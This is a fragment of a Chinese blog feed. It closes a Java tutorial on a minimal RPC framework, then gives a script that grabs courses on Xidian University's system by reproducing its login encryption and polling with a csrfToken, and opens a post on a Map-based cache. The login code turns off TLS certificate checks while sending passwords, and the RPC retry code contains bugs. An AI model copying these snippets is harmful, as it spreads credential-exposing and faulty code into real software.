        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
        &#125;

        <span class="hljs-keyword">return</span> result;

    &#125;
&#125;</code></pre>

<h2 id="服务注册中心"><a href="#服务注册中心" class="headerlink" title="服务注册中心"></a>服务注册中心</h2><p>服务注册中心的作用是在分布式系统中提供服务的发现和注册功能。它在分布式架构中起到以下重要作用：</p>
<ol>
<li>服务注册：RPC服务注册中心允许各个服务提供者将其提供的服务注册到中心服务器上。这样，客户端可以通过查询注册中心来获取服务的信息，而不必事先知道服务提供者的网络地址或位置。</li>
<li>服务发现：客户端可以向RPC服务注册中心查询需要的服务，然后获取服务的相关信息，如IP地址、端口号、协议等。这样，客户端可以动态地发现可用的服务并进行调用。</li>
<li>负载均衡：服务注册中心通常支持负载均衡策略，可以将客户端的请求分发给多个服务提供者，以实现负载均衡。这有助于提高系统的性能和可伸缩性。</li>
<li>故障恢复：如果某个服务提供者发生故障或不可用，服务注册中心可以帮助客户端检测到这种情况，并自动切换到另一个可用的服务提供者，从而提高系统的可用性和容错性。</li>
<li>服务元数据管理：服务注册中心通常还允许服务提供者添加一些元数据信息，如服务版本、描述、标签等。这有助于更好地管理和理解服务。</li>
<li>动态配置：RPC服务注册中心支持动态配置服务的相关信息，包括服务提供者的数量和位置，以适应系统的变化和需求。</li>
</ol>
<p>常见的RPC服务注册中心包括ZooKeeper、Consul、etcd、Eureka（Spring Cloud的一部分）、Nacos等。这些注册中心可以根据具体的需求选择使用，并与不同的RPC框架（如gRPC、Dubbo、Spring Cloud等）集成，以实现分布式系统的服务发现和管理。</p>
<h3 id="本地注册中心"><a href="#本地注册中心" class="headerlink" title="本地注册中心"></a>本地注册中心</h3><p>这里以本地注册演示注册中兴的作用</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalRegister</span> &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, Class&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Class&gt;();


    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(String interfaceName, String version, Class implClass)</span> &#123;
        map.put(interfaceName + version, implClass);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class <span class="hljs-title function_">getClass</span><span class="hljs-params">(String interfaceName, String version)</span> &#123;
        <span class="hljs-keyword">return</span> map.get(interfaceName + version);
    &#125;
&#125;</code></pre>



<h3 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a>服务注册</h3><p>服务提供者在启动时，需要将需要暴露的服务注册到本地注册中心</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Provider</span> &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">PORT</span> <span class="hljs-operator">=</span> <span class="hljs-number">10001</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;

        <span class="hljs-comment">// 将服务放入到本地注册</span>
        LocalRegister.register(HelloService.class.getName(), <span class="hljs-string">&quot;1.0&quot;</span>, HelloServiceImpl.class);
        LocalRegister.register(HelloService.class.getName(), <span class="hljs-string">&quot;2.0&quot;</span>, HelloServiceImpl2.class);

        <span class="hljs-comment">// 启动socket服务</span>
        <span class="hljs-type">Server</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Server</span>();
        server.start(url.getPort());
    &#125;
&#125;</code></pre>





<h2 id="远程调用"><a href="#远程调用" class="headerlink" title="远程调用"></a>远程调用</h2><p>客户端需要通过socket连接发送请求信息，实现远程调用</p>
<pre><code class="hljs java"><span class="hljs-type">Invocation</span> <span class="hljs-variable">invocation</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Invocation</span>(HelloService.class.getName(), <span class="hljs-string">&quot;sayHello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-string">&quot;2.0&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;sunzy&quot;</span>&#125;);
<span class="hljs-type">Client</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>();
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (String) client.send(invocation, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">10001</span>);

System.out.println(result);</code></pre>

<p>服务端控制台输出</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="image-20230904151231084"></p>
<p>客户端控制台输出</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230904152101884.png"></p>
<p>从上面的执行结果可以看出，已经完成远程过程调用</p>
<h2 id="使用代理对象调用目标服务"><a href="#使用代理对象调用目标服务" class="headerlink" title="使用代理对象调用目标服务"></a>使用代理对象调用目标服务</h2><p>从上面客户端的调用过程不难看出，每次想要调用一个方法都需要先创建一个Invocation对象，再发送请求，这么做不仅效率很低，而且浪费网络带宽</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyFactory</span> &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String version;


    <span class="hljs-keyword">private</span> <span class="hljs-type">LoadBalance</span> <span class="hljs-variable">loadBalance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomLoadBalance</span>();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ProxyFactory</span><span class="hljs-params">(String version)</span> &#123;
        <span class="hljs-built_in">this</span>.version = version;
    &#125;


    <span class="hljs-keyword">public</span>  &lt;T&gt; T <span class="hljs-title function_">getProxy</span><span class="hljs-params">(Class interfaceClass)</span> &#123;
        <span class="hljs-type">Object</span> <span class="hljs-variable">proxyInstance</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(interfaceClass.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;interfaceClass&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvocationHandler</span>() &#123;
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;
                <span class="hljs-comment">// 3.使用代理对象调用原始方法</span>
                <span class="hljs-type">Invocation</span> <span class="hljs-variable">invocation</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Invocation</span>(interfaceClass.getName(), method.getName(), method.getParameterTypes(),
                        version, args);

                <span class="hljs-comment">// 服务发现</span>
                List&lt;URL&gt; services = MapRemoteRegister.getClass(interfaceClass.getName());
                <span class="hljs-comment">// 负载均衡</span>
                <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

                <span class="hljs-comment">// 服务调用</span>
                <span class="hljs-type">Client</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>();
                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

                ArrayList&lt;URL&gt; invokeURLs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
                <span class="hljs-comment">// 出错重试机制</span>
                <span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;
                <span class="hljs-keyword">while</span>(max &gt; <span class="hljs-number">0</span>) &#123;

                    <span class="hljs-keyword">try</span> &#123;
                        services.remove(services);
                        invokeURLs.add(url);
                        url = loadBalance.loadBalance(services);

                    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
                        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;负载均衡出错!&quot;</span>;
                    &#125;

                    <span class="hljs-keyword">try</span> &#123;
                        result = (String) client.send(invocation, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, url.getPort());
                        System.out.println(<span class="hljs-string">&quot;代理对象执行结束!&quot;</span>);
                        <span class="hljs-keyword">return</span> result; <span class="hljs-comment">// 4.代理对象返回执行结果</span>
                    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
                        <span class="hljs-keyword">if</span>(max != <span class="hljs-number">0</span>) &#123;
                            max--;
                            <span class="hljs-keyword">continue</span>;
                        &#125;
                        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;服务调用出错!&quot;</span>;
                    &#125;
                &#125;

                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
            &#125;
        &#125;);
        <span class="hljs-keyword">return</span> (T) proxyInstance;
    &#125;
&#125;</code></pre>

<p>此时客户端的调用方式就有所改变</p>
<pre><code class="hljs java"><span class="hljs-type">ProxyFactory</span> <span class="hljs-variable">proxyFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyFactory</span>(<span class="hljs-string">&quot;1.0&quot;</span>);
<span class="hljs-type">HelloService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> proxyFactory.getProxy(HelloService.class); <span class="hljs-comment">// 1.获取代理对象</span>
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> service.sayHello(<span class="hljs-string">&quot;Hello world!111111&quot;</span>);<span class="hljs-comment">// 2.通过代理对象调用sayHello方法</span>
System.out.println(service.sayHello2(<span class="hljs-string">&quot;Hello world!111111&quot;</span>));
System.out.println(result);</code></pre>

<p>从上述代码可以看出，当获得代理对象后，客户端就可以像使用本地对象一样，随意调用该类中的函数，大大简便了RPC的调用</p>
<p>通过以上的代码我们实现了最简单的RPC框架</p>
<p>文件结构</p>
<pre><code class="hljs java">├── Consumer
│   ├── pom.xml
│   └── src
│       └── main
│           ├── java
│           │   └── org
│           │       └── example
│           │           └── Consumer
│           │               ├── Computer.java
│           │               ├── Hello.java
│           │               ├── Hello2.java
│           │               └── NodeCluster.java
│           └── resources
├── Provider
│   ├── pom.xml
│   ├── src
│       └── main
│           ├── java
│           │   └── org
│           │       └── example
│           │           ├── handler
│           │           │   └── RpcRequestHandler.java
│           │           ├── loadbalance
│           │           │   ├── Impl
│           │           │   │   └── RandomLoadBalance.java
│           │           │   └── LoadBalance.java
│           │           ├── provider
│           │           │   └── Provider.java
│           │           ├── proxy
│           │           │   └── ProxyFactory.java
│           │           ├── service
│           │           │   ├── HelloServiceImpl.java
│           │           │   └── HelloServiceImpl2.java
│           │           └── socket
│           │               ├── Client.java
│           │               └── Server.java
│           └── resources
│               └── META-INF
├── Provider-common
│   ├── pom.xml
│   ├── src
│   │   ├── main
│   │   │   ├── java
│   │   │   │   └── org
│   │   │   │       └── example
│   │   │   │           ├── common
│   │   │   │           │   ├── Invocation.java
│   │   │   │           │   ├── RpcServiceConfig.java
│   │   │   │           │   └── URL.java
│   │   │   │           ├── register
│   │   │   │           │   ├── LocalRegister.java
│   │   │   │           │   └── MapRemoteRegister.java
│   │   │   │           └── service
│   │   │   │               └── HelloService.java
│   │   │   └── resources
│   │   │       └── map.txt
│   │   └── test
│   │       └── java
│   │           └── org
│   │               └── example
└── pom.xml
</code></pre>



]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>RPC</tag>
      </tags>
  </entry>
  <entry>
    <title>XDU_choose_course</title>
    <url>/2022/09/09/XDU-choose-course/</url>
    <content><![CDATA[<h1 id="XDU-抢课脚本"><a href="#XDU-抢课脚本" class="headerlink" title="XDU 抢课脚本"></a>XDU 抢课脚本</h1><p><a href="https://github.com/sunzhengyu99/DailyClock_XDU_version">项目地址</a></p>
<h2 id="1-登录认证"><a href="#1-登录认证" class="headerlink" title="1.登录认证"></a>1.登录认证</h2><h2 id="1-1-密码加密"><a href="#1-1-密码加密" class="headerlink" title="1.1 密码加密"></a>1.1 密码加密</h2><p>首先在浏览器中在同一身份的位置进行手动登录可以发现如下的请求</p>
<ul>
<li>输入的密码已经被加密</li>
<li>表单参数中多了一个execution参数</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220909130442.png" alt="image-20220909095403214"></p>
<p>在浏览器拦截的请求中有一个<code>encrypt.js</code>的文件，猜测是用于加密密码的</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909095645965.png" alt="image-20220909095645965"></p>
<p>该文件的代码很长，但是核心的加密过程如下</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getAesString</span>(<span class="hljs-params">data, key0, iv0</span>) &#123;
  key0 = key0.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(^\s+)|(\s+$)/g</span>, <span class="hljs-string">&quot;&quot;</span>);
  <span class="hljs-keyword">var</span> key = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(key0);
  <span class="hljs-keyword">var</span> iv = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(iv0);
  <span class="hljs-keyword">var</span> encrypted = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">AES</span>.<span class="hljs-title function_">encrypt</span>(data, key, &#123;
    <span class="hljs-attr">iv</span>: iv,
    <span class="hljs-attr">mode</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">mode</span>.<span class="hljs-property">CBC</span>,
    <span class="hljs-attr">padding</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">pad</span>.<span class="hljs-property">Pkcs7</span>
  &#125;);
  <span class="hljs-keyword">return</span> encrypted.<span class="hljs-title function_">toString</span>();
&#125;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">encryptAES</span>(<span class="hljs-params">data, aesKey</span>) &#123;
  <span class="hljs-keyword">if</span> (!aesKey) &#123;
    <span class="hljs-keyword">return</span> data;
  &#125;
  <span class="hljs-keyword">var</span> encrypted = <span class="hljs-title function_">getAesString</span>(
    <span class="hljs-title function_">randomString</span>(<span class="hljs-number">64</span>) + data,
    aesKey,
    <span class="hljs-title function_">randomString</span>(<span class="hljs-number">16</span>)
  );
  <span class="hljs-keyword">return</span> encrypted;
&#125;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">encryptPassword</span>(<span class="hljs-params">pwd0, key</span>) &#123;
  <span class="hljs-keyword">try</span> &#123;
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">encryptAES</span>(pwd0, key);
  &#125; <span class="hljs-keyword">catch</span> (e) &#123;&#125;
  <span class="hljs-keyword">return</span> pwd0;
&#125;
<span class="hljs-keyword">var</span> $aes_chars = <span class="hljs-string">&quot;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&quot;</span>;
<span class="hljs-keyword">var</span> aes_chars_len = $aes_chars.<span class="hljs-property">length</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">randomString</span>(<span class="hljs-params">len</span>) &#123;
  <span class="hljs-keyword">var</span> retStr = <span class="hljs-string">&quot;&quot;</span>;
  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;
    retStr += $aes_chars.<span class="hljs-title function_">charAt</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * aes_chars_len));
  &#125;
  <span class="hljs-keyword">return</span> retStr;
&#125;</code></pre>

<p>可以看出使用的时AES的CBC模式进行加密，而AES在加密时需要一个密钥，这个密钥应该是隐藏在前端页面中，每次刷新都会更新。</p>
<p>果然在前端页面中可以找到<code>pwdEncryptSalt</code>字段，并把<code>execution</code>字段也找了出来</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909100329173.png" alt="image-20220909100329173"></p>
<p>下面就是写出AES加密的脚本(fe1w0写的)</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encryptPassword</span>(<span class="hljs-params">password, key</span>):
    <span class="hljs-comment"># password 加密, 该段代码参考于 https://github.com/EdenLin-c/CPdaily/blob/master/Jin.py</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">randomString</span>(<span class="hljs-params"><span class="hljs-built_in">len</span></span>):
        retStr = <span class="hljs-string">&#x27;&#x27;</span>
        i=<span class="hljs-number">0</span>
        <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>:
            retStr += aes_chars[(math.floor(random.random() * aes_chars_len))]
            i=i+<span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> retStr

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getAesString</span>(<span class="hljs-params">data,key,iv</span>):
        key = re.sub(<span class="hljs-string">&#x27;/(^\s+)|(\s+$)/g&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, key)
        aes = AES.new(<span class="hljs-built_in">str</span>.encode(key),AES.MODE_CBC,<span class="hljs-built_in">str</span>.encode(iv))
        pad_pkcs7 = pad(data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size, style=<span class="hljs-string">&#x27;pkcs7&#x27;</span>)
        encrypted =aes.encrypt(pad_pkcs7)
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(base64.b64encode(encrypted),<span class="hljs-string">&#x27;utf-8&#x27;</span>)
    aes_chars = <span class="hljs-string">&#x27;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&#x27;</span>
    aes_chars_len = <span class="hljs-built_in">len</span>(aes_chars)
    encrypted = getAesString(randomString(<span class="hljs-number">64</span>) + password, key, randomString(<span class="hljs-number">16</span>))
    <span class="hljs-keyword">return</span> encrypted
</code></pre>

<h2 id="1-2-获取session"><a href="#1-2-获取session" class="headerlink" title="1.2 获取session"></a>1.2 获取session</h2><p>下面就是使用requese获取登录的session</p>
<p>设置请求头</p>
<pre><code class="hljs python">headers = &#123;
    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#x27;</span>,
    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,
    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,
    <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;max-age=0&#x27;</span>,
    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,
    <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;154&#x27;</span>,
    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,
    <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;ids.xidian.edu.cn&#x27;</span>,
    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;http://ids.xidian.edu.cn&#x27;</span>,
    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://ids.xidian.edu.cn/authserver/login&#x27;</span>,
    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,
    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36&#x27;</span>,
&#125;</code></pre>

<p>获取前端页面的<code>pwdEncryptSalt</code>字段和<code>execution</code>字段，并对密码进行加密</p>
<pre><code class="hljs python">session_client = requests.Session()
requests.packages.urllib3.disable_warnings()
response = session_client.get(<span class="hljs-string">&quot;https://ids.xidian.edu.cn/authserver/login&quot;</span>)

parse_html = etree.HTML(response.text)
pwdEncryptSalt = parse_html.xpath(<span class="hljs-string">&#x27;//div//input[@id=&quot;pwdEncryptSalt&quot;]//@value&#x27;</span>)[<span class="hljs-number">0</span>]
execution = parse_html.xpath(<span class="hljs-string">&#x27;//div//input[@id=&quot;execution&quot;]//@value&#x27;</span>)[<span class="hljs-number">0</span>]
encrypt_passwrod = encryptPassword(password, pwdEncryptSalt)</code></pre>

<p>设置post请求参数</p>
<pre><code class="hljs python">post_data = &#123;
<span class="hljs-string">&quot;username&quot;</span>: user_id,
<span class="hljs-string">&quot;password&quot;</span>: encrypt_passwrod,
<span class="hljs-string">&quot;captcha&quot;</span>: <span class="hljs-literal">None</span>,
<span class="hljs-string">&quot;_eventId&quot;</span>: <span class="hljs-string">&quot;submit&quot;</span>,
<span class="hljs-string">&quot;cllt&quot;</span>: <span class="hljs-string">&quot;userNameLogin&quot;</span>,
<span class="hljs-string">&quot;dllt&quot;</span>: <span class="hljs-string">&quot;generalLogin&quot;</span>,
<span class="hljs-string">&quot;lt&quot;</span>: <span class="hljs-literal">None</span>,
<span class="hljs-string">&quot;execution&quot;</span>: execution
&#125;
sso_response = session_client.post(<span class="hljs-string">&quot;https://ids.xidian.edu.cn/authserver/login&quot;</span>, headers=headers, data=post_data,verify=<span class="hljs-literal">False</span>)</code></pre>

<h2 id="2-获取课程列表"><a href="#2-获取课程列表" class="headerlink" title="2.获取课程列表"></a>2.获取课程列表</h2><p>进入选课平台后，能够看到<code>https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/loadJhnCourseInfo.do</code>这样一条请求，查看数可知，是加载计划内选课的api</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909101535786.png" alt="image-20220909101535786"></p>
<p>再仔细看拦截的请求，可以看到很多请求参数</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909101655048.png" alt="image-20220909101655048"></p>
<p>第一个就是查询关键字参数，即将想抢课的课程代码或课程名放到此处即可获取到相应的课程信息。</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getCourseInfo</span>(<span class="hljs-params">session_client, course_KCDM</span>):
    <span class="hljs-string">&quot;&quot;&quot;</span>
<span class="hljs-string">    获取指定课程的详细信息</span>
<span class="hljs-string">    :param session_client:</span>
<span class="hljs-string">    :param course_KCDM:</span>
<span class="hljs-string">    :return:</span>
<span class="hljs-string">    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># course_KCDM = &quot;&quot;</span>
    course_infos = session_client.post(<span class="hljs-string">&quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/loadJhnCourseInfo.do?query_keyword=&quot;</span> + course_KCDM,  verify = <span class="hljs-literal">False</span>)
    course_json = json.loads(course_infos.text)[<span class="hljs-string">&quot;datas&quot;</span>]
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(course_json) == <span class="hljs-number">0</span>:

        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    course_info = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> course_json:
        <span class="hljs-keyword">if</span> course_KCDM == course[<span class="hljs-string">&quot;KCDM&quot;</span>]:
            course_info = course
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">return</span> course_info</code></pre>

<h2 id="3-监控容量并抢课"><a href="#3-监控容量并抢课" class="headerlink" title="3.监控容量并抢课"></a>3.监控容量并抢课</h2><h2 id="3-1-选课函数"><a href="#3-1-选课函数" class="headerlink" title="3.1 选课函数"></a>3.1 选课函数</h2><p>获取课程信息后，只要判断课程的容量与当前的选课人数的关系即可进行选课。点击选课按钮，发送的请求如下，可以看到加入<strong>csrfToken</strong>，那么就想办法找到它就能进行选课了。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909102145303.png" alt="image-20220909102145303"></p>
<p>在刷新选课页面时，会出现<code>https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkHome/loadPublicInfo_course.do</code>，其返回的数据中就包含了csrfToken</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909102441128.png" alt="image-20220909102441128"></p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">chooseCourse</span>(<span class="hljs-params">course_BJDM</span>):
    <span class="hljs-string">&quot;&quot;&quot;</span>
<span class="hljs-string">    选课函数，根据course_BJDM进行选课</span>
<span class="hljs-string">    :param course_BJDM:</span>
<span class="hljs-string">    :return:</span>
<span class="hljs-string">    &quot;&quot;&quot;</span>
    csrf_token_url = <span class="hljs-string">&quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkHome/loadPublicInfo_course.do&quot;</span>
    csrf_response = session_client.get(csrf_token_url).text
    json_csrf_res = json.loads(csrf_response)
    csrf_token = json_csrf_res.get(<span class="hljs-string">&quot;csrfToken&quot;</span>)
    choose_course_url = <span class="hljs-string">&quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/choiceCourse.do?bjdm=&#123;0&#125;&amp;csrfToken=&#123;1&#125;&amp;lx=0&quot;</span>.<span class="hljs-built_in">format</span>(course_BJDM, csrf_token)
    choose_response = session_client.get(choose_course_url, verify = <span class="hljs-literal">False</span>).text
    <span class="hljs-comment"># print(choose_response)</span>
    <span class="hljs-keyword">return</span> json.loads(choose_response)[<span class="hljs-string">&quot;code&quot;</span>]</code></pre>

<h2 id="3-2-监控容量并抢课"><a href="#3-2-监控容量并抢课" class="headerlink" title="3.2 监控容量并抢课"></a>3.2 监控容量并抢课</h2><p>为了防止登录的session过期可以设置一个定时任务，每个十二小时启动一次该脚本。</p>
<pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    KCDM = course_KCDM
    session_client = getSession()
    course_info = getCourseInfo(session_client = session_client, course_KCDM = KCDM)
    <span class="hljs-keyword">if</span> course_info == <span class="hljs-literal">None</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 未查询到课程信息，请检查课程代码！&quot;</span>)
        quit()
    course_KXRS = course_info[<span class="hljs-string">&quot;KXRS&quot;</span>]  <span class="hljs-comment"># 课程总容量</span>
    course_DQRS = course_info[<span class="hljs-string">&quot;DQRS&quot;</span>]  <span class="hljs-comment"># 当前选课人数</span>

    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">if</span> course_DQRS &lt; course_KXRS:
            course_BJDM = course_info[<span class="hljs-string">&quot;BJDM&quot;</span>]
            code = chooseCourse(course_BJDM)
            <span class="hljs-keyword">if</span> code == <span class="hljs-number">1</span>:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 选课成功!&quot;</span>)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 课程信息如下:&quot;</span>)
                printCourseInfo(course_info)
                quit()
            <span class="hljs-keyword">else</span>:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 选课失败!&quot;</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 当前课程容量已满!&quot;</span>)
            time.sleep(sleep_time)    <span class="hljs-comment"># 每60s查询一次</span>
            <span class="hljs-keyword">continue</span>
        <span class="hljs-comment"># 监控选课人数的变化</span>
        course_info = getCourseInfo(session_client=session_client, course_KCDM = KCDM)
        course_KXRS = course_info[<span class="hljs-string">&quot;KXRS&quot;</span>]  <span class="hljs-comment"># 课程总容量</span>
        course_DQRS = course_info[<span class="hljs-string">&quot;DQRS&quot;</span>]  <span class="hljs-comment"># 当前选课人数</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Finish&quot;</span>)</code></pre>



]]></content>
  </entry>
  <entry>
    <title>MyCache</title>
    <url>/2023/05/18/MyCache/</url>
    <content><![CDATA[<p>使用Map开发一个类似于redis的缓存工具</p>
<h1 id="实现固定缓存"><a href="#实现固定缓存" class="headerlink" title="实现固定缓存"></a>实现固定缓存</h1><h2 id="相关接口"><a href="#相关接口" class="headerlink" title="相关接口"></a>相关接口</h2><p>为了方便后续扩展首先定义接口<code>ICache</code>继承于Map</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICache</span>&lt;K, V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Map</span>&lt;K, V&gt; &#123;
&#125;</code></pre>

